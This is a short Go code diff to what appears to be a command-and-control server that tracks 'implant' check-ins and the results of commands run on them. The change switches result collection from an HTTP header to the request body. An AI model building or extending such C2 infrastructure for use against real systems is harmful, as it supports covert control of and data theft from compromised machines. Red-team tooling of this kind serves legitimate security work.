@@ -13,6 +13,7 @@ import (
 	"encoding/pem"
 	"errors"
 	"fmt"
+	"io"
 	"log"
 	"net"
 	"net/http"
@@ -73,14 +74,14 @@ func SetIt(result, uuid string) (int32, error) {
 
 	if preserved_checkin == "" {
 		fmt.Printf("\033[%dA", 2)
-		fmt.Println()
+		//fmt.Println()
 		fmt.Printf("\nNew implant check-in from %s \n", uuid)
 		fmt.Printf("\033[%dC", 10)
 	}
 
 	if prior_result != result {
 		fmt.Printf("\033[%dA", 2)
-		fmt.Println()
+		//fmt.Println()
 		fmt.Printf("\nNew result %s from implant %s that ran command %s \n", result, uuid, preserved_command)
 		fmt.Printf("\033[%dC", 10)
 
@@ -197,9 +198,10 @@ func EnableServers(address, port string) (string, error) {
 		// That info is then fed into the API
 		UUID := r.Header.Get("APPSESSIONID")
 		UUID = strings.ToLower(UUID)
-		Res := r.Header.Get("Res")
+		Res, _ := io.ReadAll(r.Body)
+		formattedRes := string(Res)
 
-		_, _ = SetIt(Res, UUID)
+		_, _ = SetIt(formattedRes, UUID)
 
 	})
 
